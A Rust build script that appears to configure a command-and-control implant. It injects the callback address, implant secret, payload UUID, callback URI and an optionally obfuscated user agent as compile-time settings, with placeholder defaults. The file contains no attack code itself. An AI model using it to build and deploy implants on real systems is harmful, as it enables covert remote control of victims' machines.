fn main() {
    let callback = std::env::var("CALLBACK").unwrap_or_else(|_| "127.0.0.1:443".to_string());
    println!("cargo:rustc-env=CALLBACK={}", callback);
    let secret = std::env::var("IMPLANT_SECRET").unwrap_or_else(|_| {
        "0000000000000000000000000000000000000000000000000000000000000000".to_string()
    });
    println!("cargo:rustc-env=IMPLANT_SECRET={}", secret);
    let uuid = std::env::var("PAYLOAD_UUID")
        .unwrap_or_else(|_| "00000000-0000-0000-0000-000000000000".to_string());
    println!("cargo:rustc-env=PAYLOAD_UUID={}", uuid);
    let callback_uri = std::env::var("CALLBACK_URI").unwrap_or_else(|_| "/".to_string());
    println!("cargo:rustc-env=CALLBACK_URI={}", callback_uri);
    // Configurable User-Agent (build parameter; empty = built-in obfuscated default)
    let user_agent = std::env::var("USER_AGENT").unwrap_or_default();
    println!("cargo:rustc-env=USER_AGENT={}", user_agent);
    println!("cargo:rerun-if-env-changed=CALLBACK");
    println!("cargo:rerun-if-env-changed=IMPLANT_SECRET");
    println!("cargo:rerun-if-env-changed=PAYLOAD_UUID");
    println!("cargo:rerun-if-env-changed=CALLBACK_URI");
    println!("cargo:rerun-if-env-changed=USER_AGENT");
}
